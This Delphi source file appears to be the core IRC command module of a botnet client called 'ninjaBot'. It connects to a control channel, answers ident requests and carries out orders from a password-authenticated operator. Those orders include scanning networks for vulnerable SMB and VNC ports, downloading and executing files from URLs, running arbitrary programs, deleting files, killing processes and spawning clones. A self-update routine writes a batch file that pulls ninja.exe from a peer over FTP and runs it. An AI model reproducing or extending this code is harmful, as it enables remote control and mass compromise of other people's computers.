unit untBot;

interface

{.$DEFINE DEBUG}
{$IFDEF DEBUG} {$APPTYPE CONSOLE} {$ENDIF}

uses
  windows,
  winsock,
  untThreads,
  untFunctions,
  untSockets,
  untGlobalDeclare,
  untCrypt,
  untOutputs,
  untScanner,
  untFTPD,
//  untNetbios,
  untHTTPDownload;

  {$I Ninja.ini}

type
  tircbot = class(tobject)
  public
    irc_nick    :string;
    irc_ident   :string;
    address     :string;
    b_channel   :string;
    key         :string;
    irc_prefix  :string;

    localip     :string;
    localhost   :string;

    silent      :boolean;

    port        :integer;
    sock        :tsocket;

    procedure connectbot;
    procedure receivedata;
    procedure generatenick;

    function sendtext(text: string; bprivate: boolean; user: string; delay: integer): integer;
    function sendraw(text: string; delay: integer): integer;
  end;

implementation

function identserv(p: pointer): dword; stdcall;
var
  port          :integer;
  sock          :tsocket;
  addr          :tsockaddrin;
  addrlen       :integer;
  sendbuf       :string;
  nick          :string;
begin
  nick := pdata(p)^.address;

  sock := socket_listen(113);
  if sock = -1 then
    exit;

  addrlen := sizeof(addr);

  repeat
    sock := accept(sock, @addr, @addrlen);
    if sock <> invalid_socket then
    begin
      sleep(1000);
      sendbuf := inttostr(random(6000)+1)+', '+inttostr(g_irc_port)+' : USERID : UNIX : '+nick+#13#10;
      send(sock, sendbuf[1], length(sendbuf), 0);
      sleep(1000);
      closesocket(sock);
    end;
  until false;
  closesocket(sock);

  result := 0;
end;

procedure tircbot.generatenick;
begin
  irc_nick := ninja_replaceshortcuts(g_irc_nick);
  sendraw('%ni% '+irc_nick+#10, 0);
end;

function tircbot.sendraw(text: string; delay: integer): integer;
begin
  if copy(text, length(text), 1) <> #10 then text:=text+#10;
  text := ninja_replaceshortcuts(text);
  result := length(text);
  outputadd(sock, text, delay);
//  result := send(sock, text[1], length(text), 0);
end;

function tircbot.sendtext(text: string; bprivate: boolean; user: string; delay: integer): integer;
begin
  if silent then exit;

  if bprivate then
    text := '%pm% '+user+' :'+Text+#10
  else
    if user <> '' then
      text := '%pm% '+b_channel+' :'+user+': '+text+#10
    else
      text := '%pm% '+b_channel+' :'+Text+#10;

  text := ninja_replaceshortcuts(text);
  result := length(text);
  outputadd(sock, text, delay);
//  result := send(sock, text[1], length(text), 0);
end;

procedure tircbot.connectbot;
var
  tempbuf       :array[0..1024] of char;
begin
  if not thread_exist(0, 'identserv') then
  begin
    thread_data.address := irc_nick;
    thread_start(1, 3, 'identserv', @identserv, @thread_data, false);
  end;

  {$IFDEF DEBUG}
    writeln('trying to connect to '+address);
  {$ENDIF}
  sock := socket_create(address, port);
  if sock = SOCKET_ERROR then exit;

  irc_nick := ninja_replaceshortcuts(g_irc_nick);
  irc_ident := ninja_replaceshortcuts(g_irc_ident);

  recv(sock, tempbuf, sizeof(tempbuf), 0);

  sendraw('%us% '+irc_nick+' '+irc_ident+'@'+irc_ident+'.com "win2k" :'+irc_nick+#10, 0);
  sendraw('%ni% '+irc_nick+#10, 0);

  receivedata;
  socket_close(sock);
end;

procedure tircbot.receivedata;
var
  buffer        :array[0..2048] of char;
  data         :array[0..32] of record
    rdata       :array[0..1024] of string;
    parms       :array[0..1024] of string;
  end;
  count         :integer;
  pcount        :integer;
  iloop         :integer;
  jloop         :integer;
  kloop         :integer;
  derr          :integer;
  threadresult  :integer;
  oldint        :boolean;
  ssock         :tsocket;

  fromnick      :string;
  fromchan      :string;
  curline       :string;
  temp          :string;

  force_priv    :boolean;
  force_silent  :boolean;
  force_nohide  :boolean;
//  force_msn     :boolean;
  force_update  :boolean;

  loggedin      :boolean;
  adminnick     :string;
  ftpsock       :tsocket;
  f             :textfile;
begin

  showtries := false;
  thread_stop(max_threads, 0, '');

  current_scan_exploit := 0;
  current_scan_count := 0;
  current_scan_ip := 'none';
  ftp_ircsock := sock;

//  {
//  while socket_recv(sock, 300) do
//  begin
//
  repeat
    fillchar(buffer, sizeof(buffer), #0);
    derr := recv(sock, buffer, sizeof(buffer), 0);
    fillchar(data, sizeof(data), #0);

    zeromemory(@jloop, sizeof(jloop));
    zeromemory(@iloop, sizeof(iloop));

    jloop := 0;
    iloop := 0;
    count := 0;
    pcount := 0;
    for jloop := 0 to derr-1 do
      if buffer[jloop] = #10 then
      begin
        inc(count);
        pcount := 0;
      end else
      begin
        if buffer[jloop] = #32 then
          inc(pcount);

        if (buffer[jloop] <> #13) and
           (buffer[jloop] <> #10) then
           begin
             if buffer[jloop] <> #32 then
               data[count].parms[pcount] := data[count].parms[pcount] + buffer[jloop];
               
             data[count].rdata[count] := data[count].rdata[count] + buffer[jloop];
           end;
      end;

      for iloop := 0 to count-1 do
      begin

        if (pos('MOTD', data[iloop].rdata[iloop]) > 0) or
           (pos('001', data[iloop].rdata[iloop]) > 0) or
           (pos('005', data[iloop].rdata[iloop]) > 0) then
           begin
             sendraw('%jo% '+b_channel+' '+key+#10, 0);
           end;

        with data[iloop] do
        begin
          if parms[0] = 'PING' then
          begin
            parms[0][2] := 'O';
            sendraw(parms[0] + #32 + parms[1] + #10, 0);
          end;

          if parms[1] = '433' then
            generatenick;

          if parms[1] = '366' then
            sendraw('%uh% '+parms[2]+#10, 0);

          if parms[1] = '302' then
          begin
            sendtext(irc_prefix + 'ver '+c_bot_name+#10, true, b_channel, 1000);

            localhost := parms[3];
            delete(localhost, 1, pos('@', localhost));
            localip := ninja_dns(pchar(localhost));
            if ftp_mainip = '' then
              ftp_mainip := localip;

            irc_nick := ninja_replaceshortcuts(g_irc_nick);
            if BehindFirewall then
            begin
              irc_nick := irc_nick + 'FW|';
              sendraw('%ni% '+irc_nick+#10, 0);

              ftp_mainip := '';
              sendraw('%pm% '+b_channel+' :' + irc_prefix + 'needftp ' + c_bot_name + #10, 1000);
            end;
          end;

          if parms[1] = '332' then
          begin
            delete(parms[4], 1, 1);

          end;

          // :nick!ident@host privmsg #chan :text
          if (parms[1] = c_privmsg) and (parms[3] <> '') then
          begin
            force_priv := false;
            force_silent := false;
            force_nohide := false;
//            force_msn := false;
            force_update := false;

            for kloop := 0 to 1023 do
            begin
              if (parms[kloop] = '+s') or (parms[kloop] = '+silent') then force_silent := true;
              if (parms[kloop] = '+p') or (parms[kloop] = '+priv') then force_priv := true;
              if (parms[kloop] = '+sh') or (parms[kloop] = '+show') then force_nohide := true;
//              if (parms[kloop] = '+m') or (parms[kloop] = '+msn') then force_msn := true;
              if (parms[kloop] = '+u') or (parms[kloop] = '+update') then force_update := true;
            end;

//            if force_msn then
//              spreadIM(trytopack(paramstr(0), ''));

            oldint := silent;
            if force_silent then silent := true;

            fromnick := copy(parms[0], 2, pos('!', parms[0])-2);
            fromchan := parms[2];
            if (fromchan[1] <> '#') or (force_priv) then fromchan := fromnick;

            delete(parms[3], 1, 1);
            curline := copy(rdata[iloop], pos(parms[2], rdata[iloop])+1, length(rdata[iloop]));
            curline := copy(curline, pos(':', curline)+1, length(curline));

            if parms[3] = g_bot_name then
              move(parms[4], parms[3], sizeof(parms));
            if parms[3] = irc_nick then
              move(parms[4], parms[3], sizeof(parms));

            if parms[3] <> '' then
              if parms[3][1] = irc_prefix then
                delete(parms[3], 1, 1)
              else
                parms[3] := '^'+parms[3];

            parms[3] := lowercase(parms[3]);

            If Adminnick = fromnick then
              LoggedIn := True
            else
              LoggedIn := False;

            if (parms[3] = 'updatefrom') then
            begin
              temp := copy(parms[4],1,pos(':',parms[4])-1);
              if scan_advportopen(inet_Addr(pchar(temp)), strtoint(copy(parms[4], pos(':', parms[4])+1, length(parms[4]))), 10, 0, ftpsock) then
              begin
                closesocket(ftpsock);
                ftp_mainip := temp;
                ftp_port := strtoint(copy(parms[4], pos(':', parms[4])+1, length(parms[4])));

                assignfile(f, 'c:\updateme.bat');
                rewrite(f);
                writeln(f, 'echo open ' + ftp_mainip + ' ' + inttostr(ftp_port) + ' > n.txt');
                writeln(f, 'echo user ' + ftp_user + ' ' + ftp_pass + ' >> n.txt');
                writeln(f, 'echo binary >> n.txt');
                writeln(f, 'echo get ninja.exe >> n.txt');
                writeln(f, 'echo quit >> n.txt');
                writeln(f, 'ftp.exe -n -s:n.txt');
                writeln(f, 'ninja.exe');
                writeln(f, 'exit');
                closefile(f);

                releasemutex(mutexhandleg);

                winexec('c:\updateme.bat', 0);
                sleep(1000);
                exitprocess(0);
              end;
            end;

            if (parms[3] = 'updateme') then
            begin
              if scan_advportopen(inet_Addr(pchar(ftp_mainip)), ftp_port, 10, 0, ftpsock) then
              begin
                closesocket(ftpsock);
                sendtext(irc_prefix + 'updatefrom ' + ftp_mainip + ':' + inttostr(ftp_port) + #10, true, fromNick, 1000);
              end;
            end;

            if (parms[3] = 'ver') then
            begin
              //*  parms[4] = '2.00'  *//
              If (StrToInt(Parms[4][1]) > StrToInt(c_bot_name[1])) Or
                 (StrToInt(Parms[4][3] + Parms[4][4]) > StrToInt(c_bot_name[3] + c_bot_name[4])) Then
                 Begin
                   //*  Newer Version  *//
                   SendText(irc_prefix + 'updateme', True, fromNick, 1000);
                 End;
            end;

            if (parms[3] = 'needftp') and (not behindfirewall) and
               (parms[4] = c_bot_name) then
               begin
                 sendtext(irc_prefix + 'useftp ' + ftp_mainip+':'+inttostr(ftp_port)+#10, true, fromNick, 1000);
               end;

            if (parms[3] = 'useftp') and (ftp_mainip = '') then
            begin
              temp := copy(parms[4],1,pos(':',parms[4])-1);
              if scan_advportopen(inet_Addr(pchar(temp)), strtoint(copy(parms[4], pos(':', parms[4])+1, length(parms[4]))), 10, 0, ftpsock) then
              begin
                closesocket(ftpsock);
                ftp_mainip := temp;
                ftp_port := strtoint(copy(parms[4], pos(':', parms[4])+1, length(parms[4])));

                sendtext('using ' + ftp_mainip + ':' + inttostr(ftp_port) + ' from ' + fromNick+', thanks.'#10, true, g_irc_channel, 1000);
              end;
            end;

            if Not LoggedIn Then
            Begin
              if (parms[3] = 'login') and
                 (parms[4] = g_irc_pass) then
                 begin
                   AdminNick := fromNick;
                   sendtext('[info] Admin logged in ('+AdminNick+').', true, fromchan, 1000);
                 end;
            end Else
            Begin
            if parms[3] = 'logout' then
            begin
              sendtext('[info] Admin logged out ('+AdminNick+').', true, fromchan, 1000);
              adminnick := '';
            end;

            (* download *)
            if parms[3] = 'download' then
            begin
              // .download http as update/run
              temp := '';
              if force_update then
                UpdateFileFromURL(parms[4], parms[5], fromchan)
              else begin
                if (parms[6] = '1') then
                  ExecuteFileFromURL(parms[4], parms[5], fromchan)
                else
                begin
                  releasemutex(mutexhandleg);
                  DownloadFileFromURL(parms[4], parms[5], fromchan);
                end;
              end;
            end;

            (* show tries *)
            if parms[3] = 'showtries' then
//              sendtext('[info] scanner not supported.', true, fromchan, 1000);
              if isnumeric(parms[4]) then
              begin
                if parms[4] = '1' then
                  showtries := true
                else
                  showtries := false;
              end else
              begin
                if showtries then
                  sendtext('[info] showing tries enabled.', true, fromchan, 1000)
                else
                  sendtext('[info] showing tries disabled.', true, fromchan, 1000);
              end;

            (* scan info *)
            if parms[3] = 'scaninfo' then
//              sendtext('[info] scanner not supported.', true, fromchan, 1000);
              scan_status(sock);

            (* start scanner *)
            if parms[3] = 'scan' then
            begin
              // -scan 7*.x.x.x 5900 0 500
              // scan x.x.x.x port delay threads +portscan
              if //(isnumeric(parms[5])) and
                 (isnumeric(parms[6])) and
                 (isnumeric(parms[7])) then
                 begin
                   globaladvscaninfo.address := parms[4];
                   if (parms[5] = 'all') then parms[5] := '139,445,5000,5900';
                   globaladvscaninfo.port := parms[5];
                   globaladvscaninfo.delay := strtoint(parms[6]);
                   if (parms[8] = '+portscan') or (parms[8] = '+ps') then
                     globaladvscaninfo.portscan := true
                   else
                     globaladvscaninfo.portscan := false;
                   globaladvscaninfo.sock := sock;

                   if force_nohide then
                     showtries := true;

                   sendtext('[scan] started '+inttostr(thread_start(strtoint(parms[7]), 2, 'scan', @scan_advscan, @globaladvscaninfo, true))+' thread(s)'+
                            ' scanning for '+parms[4]+'. port '+parms[5]+'. delay '+parms[6], true, fromchan, 1000);
                 end;
//              sendtext('[info] scanner not supported.', true, fromchan, 1000);
            end;

            (* check port *)
            if parms[3] = 'checkport' then
              if (isnumeric(parms[5]) and isnumeric(parms[6])) then
                if scan_advportopen(inet_addr(pchar(parms[4])), strtoint(parms[5]), strtoint(parms[6]), 0, ssock) then
                begin
                  sendtext('[info] port was open at '+parms[4]+':'+parms[5], false, fromchan, 1000);
                  closesocket(ssock);
                end else
                  sendtext('[info] port was closed at '+parms[4]+':'+parms[5], false, fromchan, 1000);

            (* remove/uninstall *)
            if (parms[3] = 'remove') or
               (parms[3] = 'uninstall') then
               begin
                 uninstall;
                 exitprocess(0);
               end;

            (* quit/die/exit *)
            if (parms[3] = 'quit') or
               (parms[3] = 'die') or
               (parms[3] = 'exit') then
               begin
                 delete(curline, 1, pos(parms[4], curline)-1);
                 sendraw(c_quit+' :'+curline+#10, 0);
                 exitprocess(0);
               end;

            (* reconnect/restart *)
            if (parms[3] = 'reconnect') or
               (parms[3] = 'restart') then
               begin
                 closesocket(sock);
                 if isnumeric(parms[4]) then
                   sleep(strtoint(parms[4])*1000);
                 Break;
               end;

            (* privmsg *)
            if parms[3] = 'privmsg' then
            begin
              delete(curline, 1, pos(parms[5], curline)-1);
              sendtext(curline, true, parms[4], 1000);
            end;

            (* open *)
            if parms[3] = 'open' then
              if ninja_execute(parms[4], parms[5], 1) then
                sendtext('[info] opened '+parms[4]+' successfully.', false, fromchan, 1000)
              else
                sendtext('[info] failed to open '+parms[4]+'.', false, fromchan, 1000);

            (* net info *)
            if parms[3] = 'netinfo' then
              sendtext('[info] connection: '+ninja_getnet+'. address: '+localip+'. host: '+localhost, false, fromchan, 1000);

            (* list proc *)
            if parms[3] = 'listproc' then
              ninja_listproc(sock, false, '', fromchan);

            (* kill proc *)
            if parms[3] = 'killproc' then
              if parms[4] <> '' then
                if isnumeric(parms[4]) then
                begin
                  if ninja_killproc(strtoint(parms[4])) then
                    sendtext('[info] successfully killed pid:'#2+parms[4]+#2'.', false, fromchan, 1000)
                  else
                    sendtext('[info] failed to kill pid:'#2+parms[4]+#2'.', false, fromchan, 1000);
                end else ninja_listproc(sock, true, parms[4], fromchan);

            (* join / part *)
            if parms[3] = 'join' then
              sendraw(c_join+' '+parms[4]+' '+parms[5]+#10, 0);

            if parms[3] = 'part' then
              sendraw(c_part+' '+parms[4]+' :'+parms[5]+#10, 0);

            {
            (* get cdkeys ? *)
            if parms[3] = 'getcdkeys' then
            begin
              sendtext('[info] under construction :o', false, fromchan, 1000);
            end;

            (* get *)
            if parms[3] = 'get' then
            begin
              sendtext('[info] under construction :o', false, fromchan, 1000);
            end;
            }            

            (* execute *)
            if parms[3] = 'execute' then
              if (parms[4] = '1') or
                 (parms[4] = '0') then
                 begin
                   if parms[6] <> '' then
                     delete(curline, 1, pos(parms[6], curline)-1);

                   if ninja_execute(parms[5], curline, strtoint(parms[4])) then
                     sendtext('[info] executed '#2+parms[5]+#2' successfully.', false, fromchan, 1000)
                   else
                     sendtext('[info] failed to executed '#2+parms[5]+#2'.', false, fromchan, 1000);
                 end;

            (* dns *)
            if parms[3] = 'resolve' then
              sendtext('[info] resolved '#2+parms[4]+#2' to '#2+ninja_dns(pChar(parms[4]))+#2, false, fromchan, 1000);

            (* delete *)
            if parms[3] = 'delete' then
            begin
              delete(curline, 1, pos(#32, curline));
              If DeleteFile(pChar(curline)) = true then
                sendtext('[info] deleted :'+curline, false, fromchan, 1000)
              else
                sendtext('[info] failed to deleted :'+curline, false, fromchan, 1000);
            end;

            (* set prefix *)
            if parms[3] = 'prefix' then
              if parms[4] <> '' then
              begin
                irc_prefix := parms[4];
                sendtext( '[info] prefix set to :'+irc_prefix, false, fromchan, 1000);
              end else
                sendtext( '[info] prefix :'+irc_prefix, false, fromchan, 1000);

            (* cycle *)
            if parms[3] = 'cycle' then
            begin
              if (parms[4] <> '') then
                if parms[4][1] = '#' then
                begin
                  fromchan := parms[4];
                  sendraw(c_part+' '+fromchan+#10, strtoint(parms[5])*1000);
                  sendraw(c_join+' '+fromchan+' '+parms[6]+#10, 0);
                end else
                begin
                  fromchan := b_channel;
                  sendraw(c_part+' '+fromchan+#10, strtoint(parms[4])*1000);
                  sendraw(c_join+' '+fromchan+' '+parms[5]+#10, 0);
                end;
            end;

            (* disconnect *)
            if parms[3] = 'disconnect' then
            begin
              sendraw(c_quit+' :Disconnected..'#10, 0);
              sleep(1000);
              ExitProcess(0);
            end;

            (* clone *)
            if parms[3] = 'clone' then
            begin
              thread_data.address := parms[4];
              thread_data.port := strtoint(parms[5]);
              thread_data.channel := parms[6];
              if parms[7] <> '' then
                thread_data.key := parms[7];
              thread_start(1, 3, 'irc-clone', @ninja_createclone, @thread_data, false);
            end;

            (* raw *)
            if parms[3] = 'raw' then
              sendraw(copy(curline, pos(parms[3], curline)+length(parms[3])+1, length(curline))+#10, 1000);

            (* action *)
            if parms[3] = 'action' then
              sendtext(#1'ACTION '+copy(curline, pos(parms[4], curline)+length(parms[4])+1, length(curline))+#1#10, true, parms[4], 1000);

            (* bot version *)
            if parms[3] = 'version' then
              sendtext('[info] Using ninjaBot ('+g_bot_name+')', true, fromchan, 1000);

            (* silence *)
            if parms[3] = 'silent' then
              if parms[4] = '1' then
                silent := true
              else if parms[4] = '0' then
                silent := false;

            (* new nick *)
            if parms[3] = 'newnick' then
              if parms[4] <> '' then
                sendraw('%ni% '+ninja_replaceshortcuts(parms[4])+#10, 0)
              else
                generatenick;

            (* computer info *)
            if parms[3] = 'info' then
              sendtext(ninja_getinfo, true, fromchan, 1000);

            (* crypt *)
            if parms[3] = 'crypt' then
            begin
              delete(curline, 1, pos(parms[4], curline)-1);
              sendtext(crypt(curline, c_crypt_key), true, fromchan, 1000);
            end;

            (* thread info *)
            if parms[3] = 'threadinfo' then
              sendtext(thread_info, true, fromchan, 1000);

            (* thread all info *)
            if parms[3] = 'threadall' then
              sendtext(thread_allinfo, true, fromchan, 1000);

            (* stop thread *)
            if parms[3] = 'threadstop' then
            begin
              if parms[4] = 'all' then
              begin
                if parms[5] = '' then
                  threadresult := thread_stop(max_threads, 0, '')
                else
                  threadresult := thread_stop(strtoint(parms[5]), 0, '');
              end else
              if parms[4] = 'scan' then
              begin
                if parms[5] = '' then
                  threadresult := thread_stop(max_threads, 2, '')
                else
                  threadresult := thread_stop(strtoint(parms[5]), 2, '');
              end else
              if parms[4] = 'syn' then
              begin
                if parms[5] = '' then
                  threadresult := thread_stop(max_threads, 1, '')
                else
                  threadresult := thread_stop(strtoint(parms[5]), 1, '');
              end
              else if isnumeric(parms[4]) then threadresult := thread_stophandle(strtoint(parms[4]))
              else if not isnumeric(parms[4]) then threadresult := thread_stopname(parms[4]) else
              begin
                threadresult := -1;
                sendtext('[help] threadstop [all/scan/syn] (number of threads).', true, fromchan, 1000);
              end;

              if threadresult > -1 then
                sendtext('[threads] stopped '+inttostr(threadresult)+' thread(s).', true, fromchan, 1000);
            end;
            End;

            if force_silent then silent := oldint;

          end;

        end;
      end;

//  end;
  until derr <= 0;

  sendtext('%pm% '+g_irc_channel+' :[lasterror]: bad ping.'#10, true, g_irc_channel, 1000);
//  sendraw('%qu% :Bad ping.'#10, 0);

end;

end.

